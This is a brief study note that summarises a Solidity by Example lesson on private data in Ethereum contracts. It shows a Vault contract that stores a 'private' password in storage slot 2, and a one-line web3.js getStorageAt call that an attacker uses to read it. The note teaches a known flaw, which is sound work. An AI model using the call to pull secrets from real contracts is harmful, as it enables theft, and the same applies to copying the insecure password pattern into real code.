#storage

https://solidity-by-example.org/hacks/accessing-private-data/

Private data in ethereum isn't really private, it can be still accessed via visiting the [[Storage Layout]] slot in ethereum

```solidity
// contract address: "0x534E4Ce0ffF779513793cfd70308AF195827BD31"
contract Vault { 
	// slot 0 
	uint256 public count = 123; 
	// slot 1 
	address public owner = msg.sender; 
	bool public isTrue = true; 
	uint16 public u16 = 31; 
	// slot 2 
	bytes32 private password;
	...
}
```

The attacker can recover the password using the following web3.js code
```js
web3.eth.getStorageAt("0x534E4Ce0ffF779513793cfd70308AF195827BD31", 2, console.log)
```